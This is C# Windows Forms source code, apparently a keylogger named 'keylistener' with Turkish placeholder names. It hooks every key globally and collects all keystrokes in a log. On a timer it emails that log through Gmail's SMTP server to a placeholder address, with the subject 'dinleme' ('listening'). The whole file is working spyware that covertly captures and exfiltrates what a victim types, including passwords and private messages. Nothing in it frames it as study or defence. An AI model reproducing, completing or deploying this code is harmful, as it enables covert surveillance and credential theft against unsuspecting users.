using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Mail;



namespace keylistener
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            

        }
        GlobalKeyboardHook gHook;

        string log;

        private void Form1_Load(object sender, EventArgs e)
        {
            gHook = new GlobalKeyboardHook();
            gHook.KeyDown += new KeyEventHandler(gHook_KeyDown);
            foreach (Keys key in Enum.GetValues(typeof(Keys)))
                gHook.HookedKeys.Add(key);
            gHook.hook();
        }

        public void gHook_KeyDown(object sender, KeyEventArgs e)
        {
            
            log += ((char)e.KeyValue).ToString();
        }


        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            gHook.unhook();
        }

        int sayac = 0;
        private void Timer1_Tick(object sender, EventArgs e)
        {
            sayac++;
            if(sayac==60)
            {
                mail();
                sayac = 0;
            }
        }

        void mail()
        {
            MailMessage msj = new MailMessage();
            SmtpClient client = new SmtpClient();

            client.Credentials = new System.Net.NetworkCredential("gündericieposta", "parola");
            client.Port = 587;
            client.Host = "smtp.gmail.com";
            client.EnableSsl = true;

            msj.To.Add("alicıeposta@gmail.com");
            msj.From = new MailAddress("göndericieposta@gmail.com");
            msj.Subject = "dinleme";
            msj.Body = log.ToString();

            client.Send(msj);
            log = "";
        }
    }
}
